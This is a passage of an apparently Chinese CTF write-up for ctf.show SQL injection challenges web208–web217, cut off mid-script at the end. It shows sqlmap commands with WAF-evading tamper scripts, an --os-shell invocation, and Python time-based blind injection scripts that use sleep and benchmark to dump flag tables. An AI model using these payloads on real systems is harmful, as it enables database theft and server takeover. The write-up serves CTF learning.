--referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><p>过滤了<code> </code>，<code>*</code>号和<code>=</code>，</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;1763p4504m3dcol5349rfgt5q9&quot; --tamper web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x2A</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                <span class="token comment"># retVal += "/**/"</span>                retVal <span class="token operator">+=</span> char<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对查询字符进行解密</span>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>对传入的id 进行解密处理 从而让sql语句无法执行成功 </p><p>按照他的方式 反着构造一个加密脚本 这样传进去后 服务器对id进行一系列操作就变成了 我们想到的id的值了</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;9j6o3g1dvnmvg061n1kbjlruvp&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch</code></pre><p><strong>web210.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Author:Y4tacker"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    retVal <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><p>过滤了 在web210的基础上过滤了空格 将空格替换成%0a，但是之前脚本依旧可以</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;vueov0jlmgnnbpnr8bgovga6r8&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><p>多过滤了<code>*</code>，Payload同上</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;4ob2ad7so7hia0pjdds9df53rj&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web213-–os-shell"><a href="#web213-–os-shell" class="headerlink" title="web213(–os-shell)"></a>web213(–os-shell)</h4><p>使用刚才的tamper脚本就行，但是最后使用<code>--os-shell</code>进入shell交互就行</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;mqte5lhv097hu0km2aq9c4qqri&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --os-shell</code></pre><h4 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注)"></a>web214(时间盲注)</h4><p>刷新首页抓包得到注入点(我用https的时候没抓到，http就可以了)</p><p><img src="web214.png" loading="lazy"></p><p>然后就是进行时间盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://8b0ff336-3094-4316-b708-b0d88f596b52.challenge.ctf.show/api/"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagx,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flaga,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)"</span></span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>使用单引号闭合，后面使用<code>#</code>或者闭合</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1959b6f7-1317-4f83-a586-f487063f8d90.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaa,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1) and '1'='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web216-to-base64"><a href="#web216-to-base64" class="headerlink" title="web216(to_base64)"></a>web216(to_base64)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select id from ctfshow_info where ip &#x3D; from_base64(127.0.0.1);</code></pre><p>将Payload进行base64编码并闭合即可</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://7d8b8dba-70c3-4c4e-8065-f936f72d0187.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxcc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'MQ==') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web217-benchmark"><a href="#web217-benchmark" class="headerlink" title="web217(benchmark)"></a>web217(benchmark)</h4><p><code>sleep</code>被ban了</p><p><a href="https://www.cnblogs.com/c1e4r/articles/9060525.html">sql时间盲注另外两种方式(benchmark,heavy query)</a></p><p><strong>benchmark()</strong></p><p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select BENCHMARK(10000,md5(&#39;a&#39;));+---------------------------+| BENCHMARK(10000,md5(&#39;a&#39;)) |+---------------------------+|                         0 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select BENCHMARK(1000000,md5(&#39;a&#39;));+-----------------------------+| BENCHMARK(1000000,md5(&#39;a&#39;)) |+-----------------------------+|                           0 |+-----------------------------+1 row in set (0.33 sec)mysql&gt; select BENCHMARK(10000000,md5(&#39;a&#39;));+------------------------------+| BENCHMARK(10000000,md5(&#39;a&#39;)) |+------------------------------+|                            0 |+------------------------------+1 row in set (2.93 sec)</code></pre><p>可以看到,执行不同的次数那么执行的时间也就不一样，通过这个函数我们可以达到与sleep()同样的延时目的。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ip&#x3D;1) and if(2&gt;1,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1&amp;debug&#x3D;1</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://92f2c52d-9e13-4d63-8711-5eea7dcd5ac4.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagxccb,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(700000,md5(1)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token 